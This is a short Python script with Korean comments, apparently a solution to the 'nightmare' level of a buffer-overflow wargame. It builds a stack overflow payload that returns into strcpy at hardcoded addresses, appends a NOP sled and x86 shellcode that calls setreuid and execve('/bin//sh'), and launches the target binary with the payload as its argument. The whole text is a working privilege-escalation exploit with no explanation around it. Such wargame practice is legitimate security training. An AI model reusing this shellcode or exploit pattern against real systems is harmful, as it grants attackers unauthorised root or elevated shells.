#argv에 쉘코드 삽입
import os
import struct

target = "/home/succubus/nightmare"
payload = ""
strcpyAddr = 0x8048410
strcpyArg0 = 0xbffffa20 #strcpy ret값을 가지고 있는 주소
strcpyArg1 = 0xbffffa2c
shellcodeAddr = 0xbffffa5c
shellcode = "\x90"*100 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"

def p(x):
    return struct.pack("<L", x)

def append(x):
    return payload + x

payload = append("\x90"*44)
payload = append(p(strcpyAddr)) #ret
payload = append("XXXX") #쓰레기 strcpy 리턴 주소
payload = append(p(strcpyArg0))
payload = append(p(strcpyArg1))
payload = append(p(shellcodeAddr))
payload = append(shellcode)

pid = os.fork()

#자식 프로세스
if pid == 0:
    os.execv(target, ("", payload))
else:
    os.waitpid(pid, 0)